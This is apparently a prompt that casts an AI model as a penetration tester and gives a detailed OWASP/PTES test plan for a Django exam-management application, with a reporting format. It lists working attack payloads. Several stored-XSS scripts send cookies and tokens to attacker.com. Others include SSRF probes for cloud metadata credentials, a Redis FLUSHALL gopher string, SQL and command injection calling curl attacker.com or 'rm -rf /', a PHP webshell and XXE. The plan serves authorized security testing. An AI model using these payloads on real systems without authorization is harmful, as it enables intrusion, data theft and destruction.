deeply thinking ask me anything you want before action
You are a senior offensive security engineer and penetration tester
with expertise in web application and API security assessments.

Perform a comprehensive black-box and white-box penetration test 
on the provided web application and REST API.

Technology stack:
  - Backend:      Django + Django REST Framework
  - Database:     PostgreSQL with Row-Level Security
  - Auth:         JWT + Session-based
  - Frontend:     React / Next.js
  - Cache:        Redis
  - Queue:        Celery
  - Role system:  Superuser → Admin → Coordinator → Examiner

Follow OWASP Testing Guide v4.2, OWASP API Security Top 10 2023,
and PTES (Penetration Testing Execution Standard) methodology.

═══════════════════════════════════════════════════════════════
SECTION 1 — RECONNAISSANCE & ATTACK SURFACE MAPPING
═══════════════════════════════════════════════════════════════

## 1.1 Passive Reconnaissance
Identify without touching the target:
  - Technology fingerprinting via response headers
    (Server, X-Powered-By, X-Frame-Options, CSP header)
  - Framework detection via error pages, URL patterns,
    cookie names (sessionid = Django, csrftoken = Django)
  - API versioning exposure (/api/v1/, /api/v2/)
  - Publicly exposed documentation 
    (/swagger/, /redoc/, /api/docs/, /openapi.json)
  - Git repository exposure 
    (/.git/, /.env, /config.py publicly accessible)
  - Robots.txt and sitemap.xml for hidden endpoints
  - DNS records, subdomains, CDN configuration
  - SSL/TLS certificate details — SANs revealing 
    internal hostnames or staging environments
  - JavaScript source maps (.js.map files) exposing 
    internal code structure

## 1.2 Active Reconnaissance
  - Full endpoint enumeration via:
    Burp Suite Pro crawler
    ffuf / feroxbuster directory brute-force
    Custom wordlists for Django apps:
    /admin/, /api/, /api/schema/, /api/swagger/,
    /api/redoc/, /health/, /metrics/, /debug/,
    /static/, /media/, /__debug__/
  - HTTP method enumeration per endpoint
    (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD/TRACE)
  - Parameter discovery via Arjun or Param Miner
  - API schema extraction if Swagger/OpenAPI exposed
  - Identify all authentication endpoints:
    /api/auth/login/, /api/auth/refresh/,
    /api/auth/logout/, /api/auth/register/,
    /api/auth/password-reset/
  - Map full exam hierarchy endpoints:
    /api/departments/, /api/courses/, /api/exams/,
    /api/sessions/, /api/paths/, /api/stations/,
    /api/checklist/, /api/assignments/, /api/reports/

═══════════════════════════════════════════════════════════════
SECTION 2 — CROSS-SITE SCRIPTING (XSS)
═══════════════════════════════════════════════════════════════

## 2.1 Reflected XSS
Test every input that is echoed back in the response:
  - URL parameters: ?search=<script>alert(1)</script>
  - Error messages that echo user input
  - 404 pages that reflect the requested URL
  - Login redirect parameters: ?next=javascript:alert(1)
  - Pagination parameters: ?page=<img src=x onerror=alert(1)>

Payloads to test:
  <script>alert(document.domain)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  javascript:alert(1)
  "><script>alert(1)</script>
  '><script>alert(1)</script>
  \"><script>alert(1)</script>
  <iframe src="javascript:alert(1)">
  <body onload=alert(1)>
  {{7*7}}                          ← template injection probe
  ${7*7}                           ← template injection probe

## 2.2 Stored XSS
Test every field that stores data and renders it later:
  - Exam name, description, station title
  - Checklist item descriptions
  - Department name, course name
  - Coordinator notes or comments
  - Examiner assignment notes
  - Score amendment reason field
  - Any rich text / markdown fields

For each stored field:
  1. Inject payload via API POST/PUT
  2. Retrieve the record via GET as a different user
  3. Check if payload executes in response
  4. Check if payload executes in Django admin panel
     (admin panel is high-value XSS target)

High-impact stored XSS payloads:
  <script>
    fetch('https://attacker.com/steal?c='+document.cookie)
  </script>

  <script>
    fetch('/api/auth/token/refresh/', {method:'POST'})
    .then(r=>r.json())
    .then(d=>fetch('https://attacker.com/?t='+d.access))
  </script>

  <img src=x onerror="
    var x=new XMLHttpRequest();
    x.open('GET','/api/departments/');
    x.onload=()=>fetch('https://attacker.com/?d='+x.response);
    x.send()
  ">

## 2.3 DOM-Based XSS
Analyze client-side JavaScript for:
  - document.write() with URL/hash parameters
  - innerHTML assignments with user data
  - eval() or setTimeout() with user input
  - location.hash used in DOM without sanitization
  - React dangerouslySetInnerHTML usage
  - postMessage handlers without origin validation

Check React/Next.js specific risks:
  - Are API responses rendered via dangerouslySetInnerHTML?
  - Are URL parameters injected into component state 
    without sanitization?
  - Are markdown renderers configured to allow raw HTML?

## 2.4 XSS via HTTP Headers
Test injection via headers that may be reflected:
  - User-Agent header
  - Referer header
  - X-Forwarded-For header
  - X-Original-URL header
  - Content-Type header with unusual values

## 2.5 XSS Filter Bypass Techniques
If basic payloads are blocked, test bypasses:
  - Case variation: <ScRiPt>alert(1)</sCrIpT>
  - Null bytes: <scr\x00ipt>alert(1)</script>
  - HTML encoding: &lt;script&gt;alert(1)&lt;/script&gt;
  - Unicode encoding: \u003cscript\u003e
  - Double encoding: %253Cscript%253E
  - SVG with encoded event: <svg><animate onbegin=alert(1)>
  - CSS injection: <style>*{background:url('javascript:alert(1)')}</style>
  - Template literal injection: `${alert(1)}`

## 2.6 Content Security Policy Bypass
  - Is a CSP header present? Parse and evaluate it
  - Is unsafe-inline or unsafe-eval present? → exploitable
  - Are there whitelisted CDN domains that host 
    attacker-controlled content (e.g. cdnjs.cloudflare.com)?
  - Test JSONP endpoints on whitelisted domains
  - Test CSP bypass via base-uri injection
  - Test CSP bypass via dangling markup injection

═══════════════════════════════════════════════════════════════
SECTION 3 — SERVER-SIDE REQUEST FORGERY (SSRF)
═══════════════════════════════════════════════════════════════

## 3.1 SSRF Entry Points
Identify all inputs that cause the server to make 
outbound HTTP requests:
  - URL parameters: ?url=, ?link=, ?path=, ?src=,
    ?image=, ?file=, ?redirect=, ?callback=, ?feed=,
    ?webhook=, ?endpoint=, ?target=, ?resource=
  - File upload with URL-based import
  - PDF/image generation from user-supplied URL
  - Webhook configuration endpoints
  - OAuth callback URLs
  - Import/export features that fetch remote files
  - Avatar or profile picture URL fields
  - Integration endpoints (Slack, email, external APIs)

## 3.2 Basic SSRF Probes
For each identified entry point test:

  # Internal network probing
  http://127.0.0.1/
  http://localhost/
  http://0.0.0.0/
  http://[::1]/
  http://127.0.0.1:8000/         ← Django dev server
  http://127.0.0.1:5432/         ← PostgreSQL
  http://127.0.0.1:6379/         ← Redis
  http://127.0.0.1:5555/         ← Celery Flower
  http://127.0.0.1:8080/

  # AWS metadata service
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.170.2/v2/credentials  ← ECS metadata

  # GCP metadata service
  http://metadata.google.internal/computeMetadata/v1/
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

  # Azure metadata service
  http://169.254.169.254/metadata/instance?api-version=2021-02-01

  # Internal service discovery
  http://internal-api/
  http://database/
  http://redis/
  http://rabbitmq/
  http://celery/

## 3.3 SSRF Bypass Techniques
If direct IPs are blocked:

  # DNS rebinding
  Use a DNS rebinding service to bypass IP blocklists

  # URL encoding bypass
  http://127.0.0.1%2f@evil.com/
  http://evil.com#@127.0.0.1/

  # IP encoding bypass
  http://2130706433/           ← decimal of 127.0.0.1
  http://0x7f000001/           ← hex of 127.0.0.1
  http://0177.0.0.1/           ← octal of 127.0.0.1
  http://127.000.000.001/

  # Protocol bypass
  file:///etc/passwd
  file:///etc/hosts
  file:///proc/self/environ
  dict://127.0.0.1:6379/INFO  ← Redis command via dict://
  gopher://127.0.0.1:5432/    ← PostgreSQL via gopher://
  ftp://127.0.0.1/

  # Redirect-based bypass
  Host an endpoint at evil.com that 301-redirects 
  to http://169.254.169.254/

  # IPv6 bypass
  http://[::ffff:127.0.0.1]/
  http://[::1]/

## 3.4 Blind SSRF Detection
When responses don't show server-fetched content:
  - Use Burp Collaborator or interactsh for OOB detection
  - Inject: http://<burp-collaborator-id>.burpcollaborator.net/
  - Monitor for DNS lookups and HTTP callbacks
  - Measure response time differences 
    (timeout = internal port closed, fast = open)
  - Use time-based detection for filtered environments

## 3.5 SSRF Impact Escalation
If SSRF is confirmed, attempt:
  - Read cloud metadata credentials → privilege escalation
  - Access internal admin panels not exposed externally
  - Scan internal network port ranges via response timing
  - Send commands to Redis via Gopher protocol:
    gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL
  - Access Django debug toolbar if enabled internally
  - Retrieve environment variables from 
    http://127.0.0.1:8000/__debug__/ or /metrics/

═══════════════════════════════════════════════════════════════
SECTION 4 — AUTHENTICATION & AUTHORIZATION ATTACKS
═══════════════════════════════════════════════════════════════

## 4.1 JWT Security Testing
  - Decode JWT without verification — inspect all claims
  - Test algorithm confusion: change alg to 'none'
    Header: {"alg":"none","typ":"JWT"}
    → Remove signature, send as valid token
  - Test RS256 → HS256 confusion attack:
    Sign token with public key as HMAC secret
  - Test weak secret brute-force:
    hashcat -a 0 -m 16500 <jwt> wordlist.txt
  - Test expired token acceptance
  - Test JWT with tampered role claim:
    Change "role":"EXAMINER" to "role":"SUPERUSER"
  - Test JWT with tampered department_id claim
  - Test JWT replay after logout (is token blacklisted?)
  - Test JWT kid (key ID) header injection:
    {"kid":"../../dev/null","alg":"HS256"}  ← sign with empty string
    {"kid":"| ping attacker.com"}           ← command injection in kid

## 4.2 Session Management
  - Is sessionid cookie marked HttpOnly? Secure? SameSite?
  - Session fixation: set session ID before login, 
    verify it changes after authentication
  - Session invalidation: after logout, verify old 
    session token returns 401
  - Concurrent sessions: can same account login from 
    multiple locations simultaneously?
  - Cookie scope: is cookie scoped to correct domain/path?

## 4.3 Broken Object Level Authorization (BOLA/IDOR)
Test every endpoint with object IDs:
  Login as Examiner → collect their station UUIDs
  Login as Coordinator Dept A → collect their exam UUIDs

  Then cross-test:
  - Examiner accesses Coordinator endpoints with valid UUIDs
  - Coordinator A accesses Coordinator B's resource UUIDs
  - Low-privilege user accesses high-privilege object IDs

  Test all HTTP methods:
  GET    /api/exams/<dept-B-exam-uuid>/          → must 404
  PUT    /api/exams/<dept-B-exam-uuid>/          → must 404
  DELETE /api/exams/<dept-B-exam-uuid>/          → must 404
  PATCH  /api/exams/<dept-B-exam-uuid>/          → must 404

## 4.4 Broken Function Level Authorization
  - Test accessing admin-only endpoints as Coordinator
  - Test accessing Coordinator endpoints as Examiner
  - Test HTTP method switching:
    GET allowed → try POST/PUT/DELETE on same endpoint
  - Test accessing /api/admin/ endpoints with non-Superuser JWT
  - Test Django admin panel (/admin/) with non-Superuser account

## 4.5 Mass Assignment
Test POST/PUT endpoints with extra fields:
  POST /api/exams/ with body:
  {
    "name": "Test",
    "department_id": "<other-dept-uuid>",  ← attempt dept switching
    "is_published": true,                  ← attempt status override
    "created_by": "<admin-uuid>",          ← attempt ownership change
    "weight": 100
  }

  Can an Examiner POST a score with:
  {
    "examiner": "<other-examiner-uuid>",   ← forge examiner identity
    "score": 100,
    "is_amended": false
  }

## 4.6 Password & Credential Attacks
  - Brute-force login with rate limiting check
    (is there lockout after N failed attempts?)
  - Password reset flow:
    Is reset token single-use?
    Is reset token time-limited?
    Is reset token guessable (sequential or short)?
    Host header injection in reset email:
    Host: attacker.com → reset link points to attacker
  - Username enumeration via login response differences
    ("Invalid password" vs "User not found")
  - Username enumeration via response timing

═══════════════════════════════════════════════════════════════
SECTION 5 — INJECTION ATTACKS
═══════════════════════════════════════════════════════════════

## 5.1 SQL Injection
Test all input parameters:
  - String: ' OR '1'='1
  - String: ' OR 1=1--
  - String: '; DROP TABLE exams;--
  - Boolean: 1 AND 1=1 vs 1 AND 1=2 (response diff)
  - Time-based: 1; SELECT pg_sleep(5)--
  - Error-based: 1' AND extractvalue(1,concat(0x7e,version()))--
  - Out-of-band: 1'; COPY (SELECT '') TO PROGRAM 'curl attacker.com'--

  Test ORM-specific Django attacks:
  - ?ordering=password        ← field disclosure via ordering
  - ?search=*                 ← wildcard filter bypass
  - Filter key injection:
    {"password__contains": "a"} in POST body

## 5.2 NoSQL Injection
If any MongoDB or Redis queries use user input:
  - {"$gt": ""}               ← MongoDB operator injection
  - {"$where": "sleep(1000)"} ← MongoDB JS injection

## 5.3 Command Injection
Test any file processing, export, or system features:
  - filename: "test.pdf; rm -rf /"
  - filename: "$(curl attacker.com)"
  - filename: "`id`"
  - path parameters: "../../etc/passwd"

## 5.4 Template Injection (SSTI)
Test all inputs reflected in HTML responses:
  - Django/Jinja2: {{7*7}} → 49 confirms injection
  - {{settings.SECRET_KEY}}
  - {{"".class.mro()[1].subclasses()}}
  - Escalate to RCE:
    {{''.__class__.__mro__[2].__subclasses__()[40]
    ('/etc/passwd').read()}}

## 5.5 LDAP / XML / Header Injection
  - LDAP: *)(uid=*))(|(uid=*
  - XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  - HTTP header injection via CRLF:
    ?redirect=https://evil.com%0d%0aSet-Cookie:session=evil

═══════════════════════════════════════════════════════════════
SECTION 6 — API-SPECIFIC ATTACKS (OWASP API TOP 10 2023)
═══════════════════════════════════════════════════════════════

## API1 — Broken Object Level Authorization
  (Covered in Section 4.3 above)

## API2 — Broken Authentication
  - Test token refresh endpoint abuse
  - Test API key brute-force if used
  - Test basic auth on any endpoint

## API3 — Broken Object Property Level Authorization
  - Can Examiner read score fields they should not see?
  - Does GET /api/stations/:id/ return hidden fields
    (e.g. internal_notes, correct_answers) to Examiner?
  - Test with: Accept: application/json vs XML vs CSV
    (different serializers may expose different fields)

## API4 — Unrestricted Resource Consumption
  - Test pagination abuse: ?limit=999999
  - Test deeply nested queries that cause N+1 DB load
  - Test file upload size limits
  - Test request rate without throttling:
    100 rapid requests to /api/login/ — are they blocked?
  - Test regex DoS (ReDoS) in search/filter parameters
  - Test GraphQL depth/complexity limits (if applicable)

## API5 — Broken Function Level Authorization
  - Test admin API functions with Coordinator token
  - Test undocumented endpoints discovered in 
    JavaScript bundles or API schema

## API6 — Unrestricted Access to Sensitive Business Flows
  - Can an Examiner submit scores outside session hours?
  - Can a score be submitted multiple times for same item?
  - Can a submitted/finalized score be re-opened 
    by replaying old requests?
  - Can exam session status be forced backwards 
    (FINALIZED → ACTIVE)?

## API7 — Server-Side Request Forgery
  (Covered in Section 3 above)

## API8 — Security Misconfiguration
  - CORS: test with Origin: https://evil.com header
    Does response include Access-Control-Allow-Origin: *?
    Does response reflect arbitrary Origin header?
  - OPTIONS method: what does it reveal?
  - HTTP methods: are DELETE/PATCH exposed on all endpoints?
  - Swagger/OpenAPI exposed in production?
  - Stack traces returned in 500 errors?
  - Django DEBUG mode in production?

## API9 — Improper Inventory Management
  - Test /api/v1/ vs /api/v2/ — do old versions 
    have weaker security?
  - Test /api/internal/ or /api/private/ endpoints
  - Test beta or staging endpoints reachable in production

## API10 — Unsafe Consumption of APIs
  - Does the app fetch data from third-party APIs 
    and trust it without validation?
  - Can attacker poison data from an external source 
    the app consumes?

═══════════════════════════════════════════════════════════════
SECTION 7 — BUSINESS LOGIC ATTACKS
═══════════════════════════════════════════════════════════════

## 7.1 Exam Workflow Abuse
  - Submit score to a SCHEDULED session (not yet ACTIVE)
  - Submit score to a FINALIZED session
  - Submit a score of -999 or 99999 (outside valid range)
  - Submit a BINARY score with decimal value (0.5)
  - Complete a checklist item score twice for same candidate
  - Assign same Examiner to conflicting stations 
    in same session simultaneously
  - Create an exam with a past date
  - Set exam weight to 0 or negative

## 7.2 Role Escalation
  - Create a new user via API and attempt to 
    assign Superuser role in the POST body
  - Attempt to self-assign as coordinator of a department
  - Attempt to self-assign as examiner to a station
  - Modify DepartmentCoordinator role_type via PUT 
    to escalate from RTA to HEAD

## 7.3 Race Conditions
  - Submit same checklist score simultaneously 
    from two parallel requests (duplicate check)
  - Finalize and re-open a session simultaneously
  - Assign and remove an examiner simultaneously
  - Create two exams with same name simultaneously 
    (uniqueness constraint test)

═══════════════════════════════════════════════════════════════
SECTION 8 — INFRASTRUCTURE & CONFIGURATION SECURITY
═══════════════════════════════════════════════════════════════

## 8.1 TLS / SSL
  - Protocol: SSLv2/v3/TLS 1.0/1.1 must be disabled
  - Cipher suites: weak ciphers (RC4, DES, 3DES) must 
    be disabled
  - Certificate: valid, not expired, correct hostname
  - HSTS header present with min 1 year max-age?
  - HSTS preload submitted?

## 8.2 Security Headers Audit
Check every response for:
  Strict-Transport-Security  → must be present
  Content-Security-Policy    → must be present and strict
  X-Content-Type-Options     → must be "nosniff"
  X-Frame-Options            → must be "DENY" or "SAMEORIGIN"
  Referrer-Policy            → must be "no-referrer" or 
                               "strict-origin-when-cross-origin"
  Permissions-Policy         → should restrict camera, 
                               microphone, geolocation
  Cache-Control              → sensitive API responses 
                               must include no-store

## 8.3 Error Handling
  - Trigger 400, 401, 403, 404, 405, 500 errors
  - Do error responses reveal:
    Stack traces?
    Internal file paths?
    Database error messages?
    Server software versions?
    Internal IP addresses?
    Django model or field names?

## 8.4 Exposed Sensitive Files
  Attempt to access:
  /.env
  /.env.production
  /config.py
  /settings.py
  /.git/config
  /.git/HEAD
  /requirements.txt
  /Pipfile
  /docker-compose.yml
  /Dockerfile
  /.dockerenv
  /backup.sql
  /dump.sql
  /db.sqlite3

## 8.5 Django-Specific Checks
  - /admin/ accessible without HTTPS?
  - /admin/ login page reveals Django version?
  - Django admin login page brute-forceable?
    (no rate limit, no CAPTCHA?)
  - Django debug toolbar exposed: /__debug__/
  - Django silk profiler exposed: /silk/
  - Celery Flower dashboard exposed: /flower/
  - Django extensions runserver_plus exposed?

═══════════════════════════════════════════════════════════════
SECTION 9 — FILE UPLOAD SECURITY
═══════════════════════════════════════════════════════════════

## 9.1 Malicious File Upload
Test upload endpoints with:
  - PHP webshell: <?php system($_GET['cmd']); ?> 
    saved as shell.php
  - Double extension: malware.php.jpg
  - Null byte: malware.php%00.jpg
  - Content-Type spoofing: send PHP with image/jpeg header
  - SVG with XSS: <svg><script>alert(1)</script></svg>
  - XXE via SVG or XML upload
  - Zip bomb / billion laughs (DoS via decompression)
  - Path traversal in filename: ../../etc/cron.d/evil

## 9.2 File Access Control
  - Are uploaded files served with auth check?
  - Can unauthenticated user download files 
    by guessing the URL pattern?
  - Are file URLs UUIDs or predictable sequential IDs?
  - Do media URLs expire (signed URLs) or persist forever?

═══════════════════════════════════════════════════════════════
SECTION 10 — DENIAL OF SERVICE (APPLICATION LAYER)
═══════════════════════════════════════════════════════════════

  - ReDoS: inject complex regex patterns into search fields
  - Large payload: send 100MB POST body — is request size limited?
  - Deeply nested JSON: {"a":{"a":{"a": ... 10000 levels}}}
  - Large number of objects: create 10,000 checklist items
  - Algorithmic complexity: trigger O(n²) operations 
    via crafted input
  - XML/JSON bomb: entity expansion attack in any 
    XML-accepting endpoint
  - Rapid authentication failure: trigger account lockout 
    for legitimate users (DoS via lockout)
  - Long string inputs: test max field lengths 
    (10,000 character exam name)

═══════════════════════════════════════════════════════════════
SECTION 11 — OUTPUT FORMAT
═══════════════════════════════════════════════════════════════

## Executive Summary
  - Assessment scope and methodology
  - Total findings count by severity
  - Overall risk rating: CRITICAL / HIGH / MEDIUM / LOW
  - Top 5 most critical findings
  - Immediate remediation priorities

## Vulnerability Report
For EACH finding provide:

  ┌─────────────────────────────────────────────┐
  │ ID:          PENTEST-001                    │
  │ Title:       Reflected XSS in search param  │
  │ Severity:    CRITICAL/HIGH/MEDIUM/LOW/INFO  │
  │ CVSS Score:  9.8 (provide CVSS v3.1 vector) │
  │ Category:    XSS / SSRF / SQLi / IDOR etc   │
  │ OWASP:       A03:2021 Injection             │
  │ Endpoint:    GET /api/exams/?search=        │
  │ Method:      GET                            │
  │ Parameter:   search                         │
  │ Auth needed: Yes — Coordinator JWT          │
  ├─────────────────────────────────────────────┤
  │ DESCRIPTION                                 │
  │ Technical explanation of the vulnerability  │
  ├─────────────────────────────────────────────┤
  │ PROOF OF CONCEPT                            │
  │ Exact request (curl or HTTP raw format)     │
  │ Exact response showing exploitation         │
  │ Screenshot description                      │
  ├─────────────────────────────────────────────┤
  │ ATTACK SCENARIO                             │
  │ Step-by-step real-world exploit chain       │
  │ Impact on this specific application         │
  ├─────────────────────────────────────────────┤
  │ BUSINESS IMPACT                             │
  │ Data exposed / systems compromised /        │
  │ regulations violated (GDPR, HIPAA etc)      │
  ├─────────────────────────────────────────────┤
  │ REMEDIATION                                 │
  │ Exact code fix with before/after            │
  │ Configuration change required               │
  │ Defense in depth recommendations            │
  ├─────────────────────────────────────────────┤
  │ VERIFICATION                                │
  │ How to confirm fix is effective             │
  │ Regression test to add to test suite        │
  └─────────────────────────────────────────────┘

## Attack Chain Visualization
Show the highest-severity exploit chains:
  Recon → Initial Access → Privilege Escalation → 
  Data Exfiltration → Persistence

## Remediation Roadmap
Priority-ordered fix list:
  Immediate (fix before next deployment):
    - List CRITICAL findings
  Short-term (fix within 1 week):
    - List HIGH findings
  Medium-term (fix within 1 sprint):
    - List MEDIUM findings
  Long-term (fix within 1 quarter):
    - List LOW findings

## Security Hardening Recommendations
Beyond fixing found vulnerabilities, recommend:
  - WAF rules to add
  - Rate limiting configuration
  - Security header configuration
  - Django security settings to harden
  - PostgreSQL hardening steps
  - Redis / Celery security configuration
  - Secret management improvements
  - Security monitoring & alerting to add
  - Recommended security testing to run regularly

## Full Security Checklist
  ✅ Tested and secure
  ❌ Vulnerable — see finding ID
  ⚠️  Partially mitigated — needs improvement
  ➖ Not applicable to this app

═══════════════════════════════════════════════════════════════
SECTION 12 — MATERIALS TO PROVIDE FOR TESTING
═══════════════════════════════════════════════════════════════

Provide the following for a complete assessment:

  REQUIRED:
  1.  Base URL of the application
  2.  API documentation (Swagger/OpenAPI/Postman collection)
  3.  Valid credentials for ALL role levels:
        Superuser, Admin, Coordinator (Head/Organizer/RTA),
        Examiner — from at least 2 different departments
  4.  settings.py (full file)
  5.  urls.py (root + all app-level)
  6.  views.py / viewsets.py (all)
  7.  serializers.py (all)
  8.  permissions.py
  9.  middleware.py
  10. models.py

  RECOMMENDED:
  11. requirements.txt
  12. Nginx / Apache config
  13. Docker-compose.yml
  14. Network diagram (internal services)
  15. Any known previous security findings